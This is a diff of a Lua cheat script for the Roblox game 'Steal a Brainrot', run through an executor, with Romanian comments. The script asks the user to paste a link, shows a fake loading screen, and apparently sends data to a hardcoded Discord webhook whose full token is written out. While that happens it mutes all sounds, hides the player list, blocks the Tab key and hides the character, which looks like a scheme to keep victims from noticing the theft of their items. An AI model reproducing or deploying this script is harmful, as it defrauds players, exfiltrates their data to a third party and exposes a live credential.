@@ -1,5 +1,4 @@
--- Script for Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
--- ALL SOUNDS KILLED (pași, clone, furat, tot)
+-- Script for Xeno - Steal a Brainrot (WORKING - NO SOUNDS)
 -- Compatible with Xeno Executor
 
 local Players = game:GetService("Players")
@@ -9,13 +8,10 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 
--- ===== CONFIG =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
--- ===== DISCORD =====
 local function sendToDiscord(message)
     local request = syn and syn.request or http_request or request
     if request then
@@ -30,91 +26,35 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== KILL ALL SOUNDS =====
-local function killAllSounds()
-    print("🔇 Killing ALL sounds...")
-    
-    -- 1. Volumul global la 0
-    pcall(function()
-        SoundService.Volume = 0
-    end)
-    
-    -- 2. Oprește toate sunetele existente
-    pcall(function()
-        for _, sound in pairs(game:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-                sound:Stop()
-                sound.Playing = false
-            end
+-- ===== ASTA E CEA CARE A FUNCȚIONAT =====
+local function muteAllSounds()
+    SoundService.Volume = 0
+    for _, sound in pairs(game:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+            sound:Stop()
+            sound.Playing = false
         end
-    end)
+    end
     
-    -- 3. BLOCEAZĂ ORICE SUNET NOU
     spawn(function()
         while true do
-            task.wait(0.1)
-            pcall(function()
-                SoundService.Volume = 0
-                for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") then
-                        sound.Volume = 0
-                        sound:Stop()
-                        sound.Playing = false
-                    end
+            task.wait(0.05)
+            for _, sound in pairs(game:GetDescendants()) do
+                if sound:IsA("Sound") then
+                    sound.Volume = 0
+                    sound:Stop()
+                    sound.Playing = false
                 end
-            end)
+            end
         end
     end)
-    
-    print("✅ ALL sounds killed!")
 end
 
--- ===== HIDE PLAYER LIST =====
-local function hidePlayerList()
-    pcall(function()
-        -- Distruge toate listele de jucători
-        for _, gui in pairs(CoreGui:GetChildren()) do
-            if gui:IsA("ScreenGui") then
-                local name = gui.Name:lower()
-                if name:find("leader") or name:find("player") or name:find("score") or name:find("board") or name:find("stats") or name:find("list") or name:find("scoreboard") then
-                    gui:Destroy()
-                end
-            end
-        end
-        
-        for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
-            if gui:IsA("ScreenGui") then
-                local name = gui.Name:lower()
-                if name:find("leader") or name:find("player") or name:find("score") or name:find("board") or name:find("stats") or name:find("list") or name:find("scoreboard") then
-                    gui:Destroy()
-                end
-            end
-        end
-        
-        -- Blochează tasta Tab
-        UserInputService.InputBegan:Connect(function(input)
-            if input.KeyCode == Enum.KeyCode.Tab then
-                input:StopPropagation()
-                return
-            end
-        end)
-        
-        UserInputService.InputEnded:Connect(function(input)
-            if input.KeyCode == Enum.KeyCode.Tab then
-                input:StopPropagation()
-                return
-            end
-        end)
-    end)
-    print("✅ Player list hidden! Tab blocked!")
-end
-
--- ===== HIDE BRAINROTS =====
+-- ===== ASCUNDE BRAINROT-URILE =====
 local function hideBrainrots()
     local count = 0
     local hidden = {}
-    
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and (string.find(obj.Name:lower(), "brainrot") or string.find(obj.Name:lower(), "brain") or string.find(obj.Name:lower(), "pet")) then
             pcall(function()
@@ -131,21 +71,17 @@ local function hideBrainrots()
             end)
         end
     end
-    
     _G.HiddenBrainrots = hidden
     return count
 end
 
--- ===== RESET BASE =====
+-- ===== RESETEAZĂ BAZA =====
 local function resetBase()
-    print("🔄 Resetting base...")
-    
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
             pcall(function() obj:Destroy() end)
         end
     end
-    
     if _G.HiddenBrainrots then
         for _, brainrot in pairs(_G.HiddenBrainrots) do
             pcall(function()
@@ -154,14 +90,11 @@ local function resetBase()
             end)
         end
     end
-    
     task.wait(3)
     hideBrainrots()
-    
-    print("✅ Base reset!")
 end
 
--- ===== HIDE ONLY ME =====
+-- ===== ASCUNDE PERSONAJUL =====
 local function hideMe()
     if Character then
         for _, part in pairs(Character:GetDescendants()) do
@@ -173,15 +106,28 @@ local function hideMe()
             end)
         end
         LocalPlayer.NameDisplayDistance = 0
-        for _, sound in pairs(Character:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-            end
-        end
     end
 end
 
--- ===== LOADER (VOID EXTERNAL) =====
+-- ===== ASCUNDE TAB =====
+local function hideTab()
+    for _, gui in pairs(CoreGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            local name = gui.Name:lower()
+            if name:find("leader") or name:find("player") or name:find("score") or name:find("board") or name:find("stats") or name:find("list") then
+                gui:Destroy()
+            end
+        end
+    end
+    UserInputService.InputBegan:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.Tab then
+            input:StopPropagation()
+            return
+        end
+    end)
+end
+
+-- ===== LOADER =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
@@ -396,7 +342,6 @@ local function showLoader()
 
     screenGui.Parent = CoreGui
 
-    -- ===== LOADER ANIMATION =====
     spawn(function()
         local progress = 0
         while progress < 90 do
@@ -460,7 +405,7 @@ local function showLoader()
     return screenGui
 end
 
--- ===== LINK GUI =====
+-- ===== GUI LINK =====
 local function showLinkGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "LinkInput"
@@ -532,8 +477,8 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            killAllSounds()      -- <-- AICI OPRESTE TOT
-            hidePlayerList()
+            muteAllSounds()
+            hideTab()
             local count = hideBrainrots()
             print("✅ Script active! " .. count .. " brainrots hidden.")
             
@@ -549,14 +494,11 @@ local function showLinkGUI()
     gui.Parent = CoreGui
 end
 
--- ===== MAIN =====
 local function main()
     showLinkGUI()
     print("🚀 Waiting for link input...")
-    print("🔄 Base will reset every 5 seconds.")
-    print("🔒 Tab blocked! Player list hidden!")
-    print("🔇 ALL sounds killed!")
+    print("🔄 Base resets every 5 seconds.")
+    print("🔇 ALL sounds are OFF.")
 end
 
--- ===== START =====
 pcall(main)
